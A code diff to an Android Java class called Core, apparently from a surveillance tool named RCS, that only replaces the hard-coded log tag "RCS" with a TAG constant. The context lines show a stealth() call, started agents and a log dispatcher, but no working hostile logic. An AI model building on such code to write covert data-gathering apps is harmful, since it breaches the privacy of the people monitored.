@@ -84,7 +84,7 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean Stop() {
 		bStopCore = true;
-		Log.d("RCS", "RCS Thread Stopped");
+		Log.d(TAG, "RCS Thread Stopped");
 		return true;
 	}
 
@@ -95,7 +95,7 @@ public class Core extends Activity implements Runnable {
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
-		Log.d("RCS", "RCS Thread Started");
+		Log.d(TAG, "RCS Thread Started");
 
 		stealth();
 		try {
@@ -210,15 +210,15 @@ public class Core extends Activity implements Runnable {
 			}
 			Log.i(TAG,"Agents started");
 
-			Log.d("RCS", "Core initialized");
+			Log.d(TAG, "Core initialized");
 			return true;
 
 		} catch (final RCSException rcse) {
 			rcse.printStackTrace();
-			Log.d("RCS", "RCSException() detected");
+			Log.d(TAG, "RCSException() detected");
 		} catch (final Exception e) {
 			e.printStackTrace();
-			Log.d("RCS", "Exception() detected");
+			Log.d(TAG, "Exception() detected");
 		}
 
 		return false;
@@ -337,17 +337,17 @@ public class Core extends Activity implements Runnable {
 			logDispatcher.halt();
 			logDispatcher.join();
 
-			Log.d("RCS", "LogDispatcher Killed");
+			Log.d(TAG, "LogDispatcher Killed");
 
 		} catch (final RCSException rcse) {
 			rcse.printStackTrace();
-			Log.d("RCS", "RCSException() detected");
+			Log.d(TAG, "RCSException() detected");
 		} catch (final Exception e) {
 			e.printStackTrace();
-			Log.d("RCS", "Exception() detected");
+			Log.d(TAG, "Exception() detected");
 		}
 
-		Log.d("RCS", "Exiting core");
+		Log.d(TAG, "Exiting core");
 		return;
 
 	}
